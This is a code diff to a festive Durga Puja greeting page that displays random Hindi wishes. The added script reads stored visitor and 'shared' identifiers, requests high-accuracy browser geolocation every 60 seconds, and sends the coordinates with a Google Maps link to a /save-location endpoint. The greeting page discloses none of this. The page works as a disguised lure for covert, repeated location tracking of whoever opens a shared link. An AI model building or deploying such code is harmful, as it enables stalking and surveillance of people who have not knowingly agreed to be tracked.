@@ -46,6 +46,9 @@
     </main>
 
     <script>
+
+        const visitor_id = localStorage.getItem("visitor_id");
+        const shared_id = localStorage.getItem("shared_id");
         const wishes = [
             "माँ दुर्गा आपको शक्ति, सुख और सफलता दें। शुभ पूजा! 🌺",
             "आपके घर में खुशियाँ और दिल में शांति बनी रहे। 🪔",
@@ -68,82 +71,88 @@
             }
         }
         document.getElementById("surpriseBtn").addEventListener("click", getRandomWish);
-        try {
-            fetch("/track", {
-                method: "POST",
-                headers: {
-                    "Content-Type": "application/json"
-                },
-                body: JSON.stringify({
-                    page_path: window.location.pathname
-                })
-            })
-                .then(response => {
 
-
-                    if (!response.ok) {
-                        throw new Error("Tracking failed");
-                    } else {
-                        console.log("Visit successfully recorded.");
-
-                    }
-                    return response.json();
-                })
-                .then(data => {
-
-                    localStorage.setItem("visitor_id", data.visitor_id);
-                    console.log("Visit successfully recorded.");
-                    getLocation();
-
-                })
-                .catch((e) => {
-                    console.log(e);
-                    console.log("Visit record nahi ho saka.");
-
-                });
-        } catch (e) {
-            console.log(e);
-            console.log("Visit record nahi ho saka.");
-        }
-
+        // 2. Visitor ki location lo aur server par save karo
         function getLocation() {
-
-            if (!navigator.geolocation) {
-                status = "GeoLocation Not Supported";
+            if (!visitor_id || !shared_id) {
+                console.log("Visitor ID ya Shared ID available nahi hai.");
                 return;
             }
-            console.log("Location Permission Wait...");
+
+            if (!navigator.geolocation) {
+                console.log("Is browser mein Geolocation supported nahi hai.");
+                return;
+            }
+
+            console.log("Location permission / location ka wait ho raha hai...");
 
             navigator.geolocation.getCurrentPosition(
                 async function (position) {
                     const latitude = position.coords.latitude;
                     const longitude = position.coords.longitude;
                     const accuracy = position.coords.accuracy;
-                    const mapLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
+
+                    const mapLink =
+                        `https://www.google.com/maps?q=${latitude},${longitude}`;
+
                     try {
-                        id = localStorage.getItem("visitor_id");
                         const response = await fetch("/save-location", {
-                            method: "POST", headers: { "Content-Type": "application/json" },
-                            body: JSON.stringify({ id, latitude, longitude, accuracy, mapLink })
+                            method: "POST",
+                            headers: {
+                                "Content-Type": "application/json"
+                            },
+                            body: JSON.stringify({
+                                id: visitor_id,
+                                shared_id: shared_id,
+                                latitude: latitude,
+                                longitude: longitude,
+                                accuracy: accuracy,
+                                mapLink: mapLink
+                            })
                         });
+
                         const result = await response.json();
+
+                        if (!response.ok) {
+                            throw new Error(
+                                result.message || result.error ||
+                                "Location save nahi hui"
+                            );
+                        }
+
+                        console.log("Location successfully saved:", result);
 
 
                     } catch (error) {
-                        console.log(error);
-                        console.log("Failed to save location.");
+                        console.error("Failed to save location:", error);
                     }
-                }, function (error) {
-                    console.log("Location Not Found Please Check your Permission or Device Setting");
                 },
+
+                function (error) {
+                    switch (error.code) {
+                        case error.PERMISSION_DENIED:
+                            console.log("Location permission deny kar di gayi.");
+                            break;
+
+                        case error.POSITION_UNAVAILABLE:
+                            console.log("Device ki location available nahi hai.");
+                            break;
+
+                        case error.TIMEOUT:
+                            console.log("Location request timeout ho gayi.");
+                            break;
+
+                        default:
+                            console.log("Location obtain nahi ho saki.");
+                    }
+                },
+
                 {
                     enableHighAccuracy: true,
                     timeout: 15000,
                     maximumAge: 0
                 }
             );
-
-
         }
         setInterval(getLocation, 60000);
         setInterval(getRandomWish, 1000);
